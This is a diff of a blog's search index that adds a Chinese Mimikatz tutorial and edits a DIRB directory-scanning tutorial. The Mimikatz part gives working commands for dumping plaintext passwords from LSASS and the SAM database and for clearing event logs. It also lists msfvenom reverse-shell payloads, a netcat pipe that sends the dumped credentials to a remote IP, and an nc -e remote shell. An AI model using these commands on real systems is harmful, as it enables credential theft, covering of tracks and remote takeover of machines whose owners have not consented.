@@ -1,17 +1,30 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Mimikatz]]></title>
+    <url>%2Funcategorized%2FMimikatz.html</url>
+    <content type="text"><![CDATA[简介Mimikatz 是法国人 benjamin 开发的一款功能强大的轻量级调试工具，本意是用来个人测试，但由于其功能强大，能够直接读取 WindowsXP-2012（2016 做了安全防护，需要修改注册表值，重启后生效，可以获取明文密码）等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具，从早期 1.0 版本到现在的 2.1.1 20180205 版本，其功能得到了很大的提升和扩展。 Mimikatz 最新版本一共三个文件（mimilib.dll、mimikatz.exe、mimidrv.sys），分为 Win32 位（多了一个 mimilove.exe 文件）和 X64 位。通过它们可以提升进程权限、注入进程读取进程内存，可以直接从 Lsass 中获取当前登录过系统用户的账号明文密码。Lsass 是微软 Windows 系统的安全机制它主要用于本地安全和登录策略，通常我们在登录系统时输入密码之后，密码便会储存在 lsass 内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中，而 Mimikatz 正是通过对 Lsass 的逆算获取到明文密码！ 本文以 Mimikatz 最新版为例，介绍了 Mimikatz 的参数、获取密码以及伪造黄金票据获取域控密码等用户，利用 ms14-068 结合 Mimikatz 获取域控密码等，最后文中还给出了相应的防范方法，对网络攻防都具有一定的借鉴意义。 Mimikatz参数本次测试使用 Win64 版本，将程序解压后，通过 cmd 进入当前目录，执行 Mimikatz 程序，如图1所示，随便输入即可获取帮助信息。123456789101112131415161718mimikatz # mimakatzERROR mimikatz_doLocal ; &quot;mimakatz&quot; command of &quot;standard&quot; module not found !Module : standardFull name : Standard moduleDescription : Basic commands (does not require module name) exit - Quit mimikatz //退出 cls - Clear screen (doesn&apos;t work with redirections, like PsExec) //清屏 answer - Answer to the Ultimate Question of Life, the Universe, and Everything //对生命，宇宙和万物的终极问题的回答 coffee - Please, make me a coffee! //显示coffee图案 sleep - Sleep an amount of milliseconds 默认睡眠1000ms，后跟时间参数 log - Log mimikatz input/output to file //记录 Mimikatz 所有的输入和输出到当前目录下的 log.txt 文件 base64 - Switch file input/output base64 //将输入/输出转换成 base64 编码 version - Display some version informations //查看 Mimikatz 的版本 cd - Change or display current directory //切换或者显示当前目录 localtime - Displays system local date and time (OJ command) //显示系统当前时间和 UTC 时间 hostname - Displays system local hostname //显示主机的名称。 使用模块输入“::”显示其支持模块信息。standard：标准模块，基本命令，不需要模块信息。crypto：加密模块，其后跟以下参数，其使用命令为 crypto:: 参数名，例如 crypto::providers。12345678910111213141516171819202122232425262728293031mimikatz # crypto::providersCryptoAPI providers : 0. RSA_FULL ( 1) - Microsoft Base Cryptographic Provider v1.0 1. DSS_DH (13) - Microsoft Base DSS and Diffie-Hellman Cryptographic Provider 2. DSS ( 3) - Microsoft Base DSS Cryptographic Provider 3. RSA_FULL ( 1) H - Microsoft Base Smart Card Crypto Provider 4. DH_SCHANNEL (18) - Microsoft DH SChannel Cryptographic Provider 5. RSA_FULL ( 1) - Microsoft Enhanced Cryptographic Provider v1.0 6. DSS_DH (13) - Microsoft Enhanced DSS and Diffie-Hellman Cryptographic Provider 7. RSA_AES (24) - Microsoft Enhanced RSA and AES Cryptographic Provider 8. RSA_SCHANNEL (12) - Microsoft RSA SChannel Cryptographic Provider 9. RSA_FULL ( 1) - Microsoft Strong Cryptographic ProviderCryptoAPI provider types: 0. RSA_FULL ( 1) - RSA Full (Signature and Key Exchange) 1. DSS ( 3) - DSS Signature 2. RSA_SCHANNEL (12) - RSA SChannel 3. DSS_DH (13) - DSS Signature with Diffie-Hellman Key Exchange 4. DH_SCHANNEL (18) - Diffie-Hellman SChannel 5. RSA_AES (24) - RSA Full and AESCNG providers : 0. Microsoft Key Protection Provider 1. Microsoft Passport Key Storage Provider 2. Microsoft Platform Crypto Provider 3. Microsoft Primitive Provider 4. Microsoft Smart Card Key Storage Provider 5. Microsoft Software Key Storage Provider 6. Microsoft SSL Protocol Provider 7. Windows Client Key Protection Provider 参考加密算法提供类型及名单123456789101112131415Module : cryptoFull name : Crypto Module providers - List cryptographic providers //该命令列出所有 CryptoAPI 提供者。 stores - List cryptographic stores //列出系统存储中的逻辑存储，crypto::stores /systemstore:local_machine。 certificates - List (or export) certificates //显示或者导出证书。 keys - List (or export) keys containers //列出或者显示密钥。 sc - List smartcard readers //此命令列出系统上的智能卡/令牌读取器或将其移出系统；当 CSP 可用时，它会尝试在智能卡上列出密钥。 hash - Hash a password with optional //显示当前用户的的哈希（LM、NTLM、md5、sha1、sha2）计算值。username system - Describe a Windows System Certificate (file, TODO:registry or hive) //描述 Windows 系统证书（注册表或者 hive 文件）。 scauth - Create a authentication certitifate (smartcard like) from a CA //从 CA 创建一个认证（智能卡等） certtohw - Try to export a software CA to a crypto (virtual)hardware //尝试将软件 CA 导出到加密（虚拟）硬件中。 capi - [experimental] Patch CryptoAPI layer for easy export //修补 CryptoAPI 程序方便导出。 cng - [experimental] Patch CNG service for easy export //修补 CNG 服务方便导出。 extract - [experimental] Extract keys from CAPI RSA/AES provider //从 CAPI RSA/AES 提供者获取密钥。 sekurlsa 枚举用户凭证123456789101112131415161718 msv - Lists LM &amp; NTLM credentials //获取 LM &amp; NTLM 凭证，可以获取明文密码。 wdigest - Lists WDigest credentials //获取 WDigest 凭证，可以获取明文密码 kerberos - Lists Kerberos credentials //获取 Kerberos 凭证。 tspkg - Lists TsPkg credentials //获取 TsPkg 凭证。 livessp - Lists LiveSSP credentials //获取LiveSSP 凭证。 ssp - Lists SSP credentials //获取凭证。logonPasswords - Lists all available providers credentials //获登录用户信息及密码，如果是在系统权限或者 psexec 进入的系统权限下，直接使用该命令，而无需运行 privilege::debug，否则需要运行该命令。 process - Switch (or reinit) to LSASS process context //切换或者恢复到 lsass 初始状态。 minidump - Switch (or reinit) to LSASS minidump context //切换或者恢复到 minidump 初始状态。 pth - Pass-the-hash //Pass-the-hash krbtgt - krbtgt! //krbtgt! dpapisystem - DPAPI_SYSTEM secret //显示DPAPI_SYSTEM密码值。 trust - Antisocial //显示 Kerberos 票据。 backupkeys - Preferred Backup Master keys //首选备份主密钥 tickets - List Kerberos tickets //列出Kerberos票据 ekeys - List Kerberos Encryption Keys //显示 Kerberos 加密密钥。 dpapi - List Cached MasterKeys //显示内存中的 MasterKeys credman - List Credentials Manager //显示管理员凭证。 kerberos：Kerberos 包模块 123456789 debug - Ask debug privilege //请求调试权限。 driver - Ask load driver privilege //请求装载驱动权限。security - Ask security privilege //请求装载驱动权限。 tcb - Ask tcb privilege //请求 tcb 权限。 backup - Ask backup privilege //请求 backup 权限。 restore - Ask restore privilege //请求恢复权限。 sysenv - Ask system environment privilege //请求系统环境权限。 id - Ask a privilege by its id //请求 id 特权，参数后跟具体的 id 值，例如请求特权 8：privilege：：id 8。 name - Ask a privilege by its name //请求指定名称的权限 process：进程模块123456789 list - List process //列出进程exports - List exports //导出进程imports - List imports //导入进程 start - Start a process //开始一个进程，后跟进程名称 stop - Terminate a process //停止一个进程，process::stop /pid:1692（结束 pid 为1692的进程）。suspend - Suspend a process //挂起一个进程。 resume - Resume a process //恢复一个进程。 run - Run! //运行一个进程。 runp - service：Service module12345678910service::start：开始服务。service::remove：移除服务。service::stop：停止服务。service::suspend：暂停服务。service::resume：恢复服务。service::preshutdown：预关闭服务。service::shutdown：关闭服务。service::list：列出服务。service::+ - 安装 Mimikatz 服务。service::- - 卸载 Mimikatz 服务。 lsadump：LsaDump moduleLsadump::sam：该命令转储安全帐户管理器（SAM）数据库，它包含用户密码的 NTLM，有时包含 LM 哈希。 在线命令提升模式获取：1234privilege::debugtoken::whoamitoken::elevatelsadump::sam 离线获取，通过以下方式备份 SYSTEM＆SAM 配置：12reg save HKLM\SYSTEM SystemBkup.hivreg save HKLM\SAM SamBkup.hiv 或者使用 Volue Shadow Copy / BootCD 来备份这些文件：12C:\Windows\System32\config\SYSTEMC:\Windows\System32\config\SAM 然后执行 mimikatz # lsadump::sam SystemBkup.hiv SamBkup.hiv 即可获取。 可在线进行破解查询。123456789Lsadump::secrets：从 registry 或者 hives 获取保存的密码凭据，可以直接获取明文密码。Lsadump::cache：获取内存中的密码值。Lsadump::lsa：从 lsa 服务器获取密码，lsadump::lsa /inject /name:krbtgt。Lsadump::trust：Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fbackupkeys rpdata。Lsadump::dcsync：Ask a DC to synchronize an object。Lsadump::dcshadow：They told me I could be anything I wanted, so I became a domain controller。Lsadump::setntlm：Ask a server to set a new password/ntlm for one user。Lsadump::changentlm：Ask a server to set a new password/ntlm for one user。Lsadump::netsync：Ask a DC to send current and previous NTLM hash of DC/SRV/WKS。 ts 终端服务模块12ts::sessions：显示当前的会话。ts::multirdp：允许多个用户使用 rdp，安装 rdp 补丁。 event 事件模块event::drop：启用事件补丁服务，不再记录新产生的事件。event::clear：清除时间日志 misc 杂项模块，打开 cmd、regedit、taskmgr、ncroutemon、detours、wifi、addsid、memssp、skeleton 等。 token：令牌操作模块12345token::whoami：显示当前的身份。token::list：列出系统所有的令牌。token::elevate：冒充令牌。token::run：运行。token::revert：恢复到进程令牌。 vault：Windows 信任/凭证模块，Vault::list 列出 Windows 信任/凭证。 net 显示 user、group、alias、session、wsession、tod、stats、share、serverinfo 等信息。 Mimikatz 获取密码旧版本配合 psexec 密码获取方法及命令1234567到 tools 目录，psexec \127.0.0.1 cmd执行 mimikatz执行 privilege::debug执行 inject::process lsass.exe sekurlsa.dll执行 @getLogonPasswordswidget 就是密码exit 退出，不要直接关闭否则系统会崩溃 bat 脚本获取法:创建 get.bat 脚本123@echo offmimikatz.exe &lt;command.txt &gt;pass.txtexit 创建 command.txt 文件1234privilege::debuginject::process lsass.exe sekurlsa.dll @getLogonPasswordsExit 执行 get.bat 文件即可获取密码，pass.txt 记录的即为获取的密码，get.bat、command.txt 和 mimikatz.exe 在同一个文件夹下。 Mimikatz 2.0 以上版本获取系统明文密码 sekurlsa 获取12privilege::debugsekurlsa::logonpasswords Lsadump 获取密码Lsadump::secrets MSF 下 Mimikatz 获取密码需要生成一个反弹的可执行程序或者通过漏洞直接获取一个反弹的 shell。下面是通过 msfvenom 生成 shell：1234567891011121314Linux：msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elfWindows：msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exeMac：msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.machoPHP：msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpasp：msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.aspJSP：msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jspWAR：msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.warScripting PayloadsPython：msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pyBash：msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.shPerl：msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.plLinux Based Shellcode：msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;Windows Based Shellcode：msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;Mac Based Shellcode：msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt; 在架构中比较好用的有两个cmd/powershell_base64和x86/shikata_ga_nai，下面生成一个实例（反弹的服务器 IP 为 192.168.126.142):1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.106.133 LPORT=4444 -f exe &gt; shell.exe 运行 msfconsole 并设置： 12345use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.106.133set lport 4444run或者exploit 在测试计算机上运行 exe 文件。在 msf 获取反弹的 shell，如下： getuid 获取当前帐号为系统权限，则进行后续操作，否则通过 ps 命令去获取小于 1000 以内的 pid，执行 migrate pid 来提升权限后，继续执行后续步骤。load mimikatz //启动 运行 mimikatz 下面的凭证获取命令： kerberos 获取网络认证协议凭证，其中可能会有明文密码 msv 获取msv 凭证，其中包含LM和NTLM哈希密码值 wdigest 获取wdigest （摘要式身份验证）凭证，其中可能会有明文密码可以执行 hashdump 来导出系统的哈希密码值。 Mimikatz 使用技巧获取并记录密码到 mimikatz.log 文件mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords &quot;&quot; exit &amp;&amp; dir 输出到本地 log.txt 文件mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords&quot;&quot; exit &gt;&gt; log.txt 记录新密码到文件有时候获取的哈希是旧的，这时需要记录新的登录哈希值，可以使用以下命令来记录，记录的结果在 c:\windows\system32\mimilsa.log。123mimikatz.exeprivilege::debugmisc::memssp 通过 nc 命令将 mimikatz 执行结果传输到远程取结果服务器（192.168.126.142）执行监听命令nc -vlp 44444 在想获取密码的服务器上执行mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords &quot;&quot; exit | nc.exe -vv 192.168.106.145 4444 通过 nc 命令远程执行 mimikatz在黑客反弹计算机（192.168.126.130）上执行 nc.exe -vlp 4444；在被攻击计算机（192.168.126.142）上执行 nc.exe -vv 192.168.126.142 4444 -e mimikatz.exe。接着就会反弹到 192.168.126.130 的 4444 端口，出来一个 cmd 的窗口，可以在该窗口进行密码获取.]]></content>
+      <tags>
+        <tag>工具</tag>
+        <tag>web安全</tag>
+        <tag>TOOLS</tag>
+        <tag>渗透测试</tag>
+        <tag>目录扫描</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[DIRB]]></title>
-    <url>%2FTOOLS%2FWEB%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%2FDIRB.html</url>
+    <url>%2FTOOLS%2FWEB%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%2FWEB%E7%88%AC%E8%A1%8C%2FDIRB.html</url>
     <content type="text"><![CDATA[简介DIRB是一个Web内容扫描程序。它查找现有（和/或隐藏）Web对象。它基本上是通过对Web服务器启动基于字典的攻击并分析响应来实现的。 DIRB附带了一组预先配置的攻击单词列表，方便使用，但您可以使用自定义单词列表。DIRB有时也可以用作经典的CGI扫描仪，但记住的是内容扫描程序而不是漏洞扫描程序。 DIRB的主要目的是帮助进行专业的Web应用程序审计。特别是在安全相关的测试中。它涵盖了经典Web漏洞扫描程序未涵盖的一些漏洞。DIRB查找其他通用CGI扫描仪无法查找的特定Web对象。它不会搜索漏洞，也不会查找可能存在漏洞的Web内容。 参数12345678910111213141516171819202122232425262728293031323334353637383940414243444546root@kali:~# dirb-----------------DIRB v2.22By The Dark Raver-----------------dirb &lt;url_base&gt; [&lt;wordlist_file(s)&gt;] [options]========================= NOTES ========================= &lt;url_base&gt; : Base URL to scan. (Use -resume for session resuming) &lt;wordlist_file(s)&gt; : List of wordfiles. (wordfile1,wordfile2,wordfile3...)======================== HOTKEYS ======================== &apos;n&apos; -&gt; Go to next directory. &apos;q&apos; -&gt; Stop scan. (Saving state for resume) &apos;r&apos; -&gt; Remaining scan stats.======================== OPTIONS ======================== -a &lt;agent_string&gt; : Specify your custom USER_AGENT. -b : Use path as is. -c &lt;cookie_string&gt; : Set a cookie for the HTTP request. -E &lt;certificate&gt; : path to the client certificate. -f : Fine tunning of NOT_FOUND (404) detection. -H &lt;header_string&gt; : Add a custom header to the HTTP request. -i : Use case-insensitive search. -l : Print &quot;Location&quot; header when found. -N &lt;nf_code&gt;: Ignore responses with this HTTP code. -o &lt;output_file&gt; : Save output to disk. -p &lt;proxy[:port]&gt; : Use this proxy. (Default port is 1080) -P &lt;proxy_username:proxy_password&gt; : Proxy Authentication. -r : Don&apos;t search recursively. -R : Interactive recursion. (Asks for each directory) -S : Silent Mode. Don&apos;t show tested words. (For dumb terminals) -t : Don&apos;t force an ending &apos;/&apos; on URLs. -u &lt;username:password&gt; : HTTP Authentication. -v : Show also NOT_FOUND pages. -w : Don&apos;t stop on WARNING messages. -X &lt;extensions&gt; / -x &lt;exts_file&gt; : Append each word with this extensions. -z &lt;millisecs&gt; : Add a milliseconds delay to not cause excessive Flood.======================== EXAMPLES ======================= dirb http://url/directory/ (Simple Test) dirb http://url/ -X .html (Test files with &apos;.html&apos; extension) dirb http://url/ /usr/share/dirb/wordlists/vulns/apache.txt (Test with apache.txt wordlist) dirb https://secure_url/ (Simple Test with SSL) dirb用法示例攻击中，common.txt被设置为目录遍历的默认单词列表使用字典文件（/usr/share/wordlists/dirb/common.txt）扫描Web服务器（http://192.168.126.130/）以获取目录：dirb 目标 字典路径1234567891011121314root@kali:/# dirb http://192.168.126.130 /usr/share/wordlists/dirb/common.txt-----------------DIRB v2.22By The Dark Raver-----------------START_TIME: Fri Feb 22 16:33:46 2019URL_BASE: http://192.168.126.130/WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt-----------------GENERATED WORDS: 4612 枚举具有特定扩展名列表的目录在很多情况下我们需要在目标服务器上提取特定扩展的目录，然后我们可以使用dirb扫描的-X参数。此参数接受文件扩展名，然后在目标服务器或计算机上搜索给定的扩展文件。dirb 目标 -X .php上面的命令将提取与php扩展相关的所有目录路径，如下图所示123456789101112131415161718192021root@kali:/# dirb http://192.168.126.130 -X .php-----------------DIRB v2.22By The Dark Raver-----------------START_TIME: Fri Feb 22 17:12:16 2019URL_BASE: http://192.168.126.130/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txtEXTENSIONS_LIST: (.php) | (.php) [NUM = 1]-----------------GENERATED WORDS: 4612---- Scanning URL: http://192.168.126.130/ ---------------------END_TIME: Fri Feb 22 17:12:24 2019DOWNLOADED: 4612 - FOUND: 0 将输出保存到磁盘出于记录维护，更好的可读性和未来参考的目的，我们将dirb扫描的输出保存到文件中。为此，我们将使用dirb扫描的参数-o，我们可以在文本文件中保存dirb扫描的输出。dirb 目标 -o /位置/自定义名称.txt上面的命令将在枚举目录的桌面上生成.txt文件。123456789101112131415root@kali:/# dirb http://192.168.126.130 -o /root/123.txt-----------------DIRB v2.22By The Dark Raver-----------------OUTPUT_FILE: /root/123.txtSTART_TIME: Fri Feb 22 17:15:22 2019URL_BASE: http://192.168.126.130/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612 root@kali:~# cat /root/123.txt现在我们已经成功执行了命令，现在让我们遍历该位置以确保输出是否已保存在文件上。在这种情况下，我们的输出位置是/root/123.txt。 忽略不必要的状态代码Status-Code元素是一个3位整数，其中Status-Code的第一个数字定义了响应类，后两个数字没有任何分类角色。在这次攻击中，我们在代码302上使用-N参数，如下所示。dirb 目标 -N 302您可以从给定的屏幕截图中了解到dirb扫描忽略的是NOT FOUND代码，即302。123456root@kali:~# dirb http://192.168.126.130 -N 302-----------------DIRB v2.22By The Dark Raver----------------- 默认工作与警告消息不间断工作正常dirb扫描期间，一些页面会生成警告; dirb扫描会跳过遇到任何警告的目录。在进行非常深入和冗长的扫描时，我们希望dirb扫描不要避免这些警告并进行深入扫描，因此我们使用dirb扫描的-w参数。dirb 目标 -w您可以观察到突出显示的目录/ dev / shell即使在默认扫描中缺少警告消息之后也会被枚举123456root@kali:~# dirb http://192.168.126.130 -w-----------------DIRB v2.22By The Dark Raver----------------- 速度延迟在不同场景下工作时，我们遇到的某些环境无法处理由dirb扫描创建的洪水，因此在这些环境中，我们将扫描延迟一段时间非常重要。使用dirb扫描的-z参数可以轻松完成此操作。在此参数中，时间以毫秒为单位提供。就像我们给出的例子中所示，我们给dirb延迟了100秒。dirb 目标 -z 1001234567891011root@kali:~# dirb http://192.168.126.130 -z 100-----------------DIRB v2.22By The Dark Raver-----------------START_TIME: Fri Feb 22 18:11:47 2019URL_BASE: http://192.168.126.130/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txtSPEED_DELAY: 100 milliseconds 不递归（-r）默认情况下，dirb扫描以递归方式扫描目录。这意味着它扫描目录，然后遍历该目录以扫描更多子目录。但在某些情况下，如果时间不够，我们会将dirb设置为不递归扫描。这可以使用-r参数来实现。1234567891011root@kali:~# dirb http://192.168.126.130 -r-----------------DIRB v2.22By The Dark Raver-----------------START_TIME: Fri Feb 22 18:13:13 2019URL_BASE: http://192.168.126.130/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txtOPTION: Not Recursive 显示不存在页面404错误是HTTP状态代码，表示您尝试在网站上访问的页面无法在其服务器上找到。404 Not Found错误消息经常由各个网站自定义。在某些情况下，我们也需要找到404页面，默认情况下dirb会跳过。要查找这些页面，我们将使用-v参数。dirb 目标 -v从下面中你可以观察到它还提取了所有那些与404错误相关的目录。1234567891011root@kali:~# dirb http://192.168.126.130 -v-----------------DIRB v2.22By The Dark Raver-----------------START_TIME: Fri Feb 22 18:14:17 2019URL_BASE: http://192.168.126.130/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txtOPTION: Show Not Existent Pages 扩展名列表（-X参数）与扩展名标头（-H参数）通过将-X参数与具有特定扩展名的目标URL（例如.php）一起使用，它枚举所有扩展名为.php的文件或目录，但使用带有特定扩展名的-H参数，例如.php以及目标URL它将枚举用php命名的所有文件或目录，如下面给出的图像所示。dirb 目标 -H .PHP1234567891011121314root@kali:~# dirb http://192.168.126.130 -H .php-----------------DIRB v2.22By The Dark Raver-----------------START_TIME: Fri Feb 22 18:16:36 2019URL_BASE: http://192.168.126.130/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txtADDED_HEADERS:--.php-- HTTP AUTHORIZATION（-u用户名：密码）HTTP身份验证/身份验证机制都基于使用401状态代码和WWW- Authenticate 响应头。最广泛使用的 HTTP身份验证 机制是 Basic。客户端将用户名和密码作为未加密的base64编码文本发送。 因此，为了在dirb的帮助下绕过这种身份验证，我们使用了以下命令：dirb 目标 -u test:test结果，它显示了测试的状态码200：目标URL上的测试和授权凭证。1234567891011root@kali:~# dirb http://192.168.126.130/admin/admin.asp -u test:test-----------------DIRB v2.22By The Dark Raver-----------------START_TIME: Fri Feb 22 18:22:47 2019URL_BASE: http://192.168.126.130/admin/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txtAUTHORIZATION: test:test 代理URL使用-p选项可以将代理URL用于所有请求，默认情况下它适用于端口1080.正如您所看到的，在Web浏览器中探索目标网络IP时，它会显示“访问禁止错误”，这意味着此网页是在一些代理后面运行。 测试特殊弱势列表我们可以使用DIRB来测试特定类型的Web技术中的特定易受攻击对象。每种Web技术都有不同的漏洞。他们并非都是一样的。DIRB可以帮助我们查找特定技术特定的特定易受攻击对象。 在Kali，DIRB有特定的单词列表来搜索这些易受攻击的经常隐藏的对象。您可以在以下位置找到它们12345678root@kali:/# cd /usr/share/dirb/wordlists/vulns/root@kali:/usr/share/dirb/wordlists/vulns# lsapache.txt fatwire.txt jboss.txt sap.txt weblogic.txtaxis.txt frontpage.txt jersey.txt sharepoint.txt websphere.txtcgis.txt hpsmh.txt jrun.txt sunas.txtcoldfusion.txt hyperion.txt netware.txt tests.txtdomino.txt iis.txt oracle.txt tomcat.txtfatwire_pagenames.txt iplanet.txt ror.txt vignette.txt 正如您在上面所看到的，每个要测试的特定漏洞都有许多文件列表。如果您的Web服务器是Apache，并且您想测试它，请使用apache.txt 现在，DIRB将使用该Apache列表来查找已知的易受攻击对象。如果它找到任何，那么您可以采取下一步并寻找漏洞，以利用它在Exploit-DB，Metasploit，SecurityFocus或Web上的任何其他许多漏洞利用源。当然，您必须使用与网站中使用的技术相适应的词汇表。例如，如果它是Windows IIS服务器，则应使用iis.txt wordlist。]]></content>
       <categories>
         <category>TOOLS</category>
         <category>WEB应用程序</category>
+        <category>WEB爬行</category>
       </categories>
       <tags>
+        <tag>工具</tag>
         <tag>web安全</tag>
         <tag>TOOLS</tag>
-        <tag>工具</tag>
         <tag>渗透测试</tag>
         <tag>目录扫描</tag>
       </tags>
@@ -25,8 +38,8 @@
         <category>metasploit</category>
       </categories>
       <tags>
-        <tag>web安全</tag>
         <tag>工具</tag>
+        <tag>web安全</tag>
         <tag>渗透测试</tag>
         <tag>metasploit</tag>
         <tag>信息搜集</tag>
@@ -54,8 +67,8 @@
         <category>信息搜集篇</category>
       </categories>
       <tags>
-        <tag>web安全</tag>
         <tag>工具</tag>
+        <tag>web安全</tag>
       </tags>
   </entry>
   <entry>
@@ -67,8 +80,8 @@
         <category>信息搜集篇</category>
       </categories>
       <tags>
-        <tag>web安全</tag>
         <tag>工具</tag>
+        <tag>web安全</tag>
       </tags>
   </entry>
   <entry>
@@ -80,8 +93,8 @@
         <category>metasploit</category>
       </categories>
       <tags>
-        <tag>web安全</tag>
         <tag>工具</tag>
+        <tag>web安全</tag>
         <tag>渗透测试</tag>
         <tag>metasploit</tag>
       </tags>
@@ -95,8 +108,8 @@
         <category>metasploit</category>
       </categories>
       <tags>
-        <tag>web安全</tag>
         <tag>工具</tag>
+        <tag>web安全</tag>
         <tag>渗透测试</tag>
         <tag>metasploit</tag>
       </tags>
@@ -110,8 +123,8 @@
         <category>metasploit</category>
       </categories>
       <tags>
-        <tag>web安全</tag>
         <tag>工具</tag>
+        <tag>web安全</tag>
         <tag>渗透测试</tag>
         <tag>metasploit</tag>
       </tags>
@@ -130,8 +143,8 @@
         <category>Nmap</category>
       </categories>
       <tags>
-        <tag>web安全</tag>
         <tag>工具</tag>
+        <tag>web安全</tag>
         <tag>渗透测试</tag>
         <tag>Nmap</tag>
       </tags>
@@ -145,8 +158,8 @@
         <category>sqlmap</category>
       </categories>
       <tags>
-        <tag>web安全</tag>
         <tag>工具</tag>
+        <tag>web安全</tag>
       </tags>
   </entry>
   <entry>
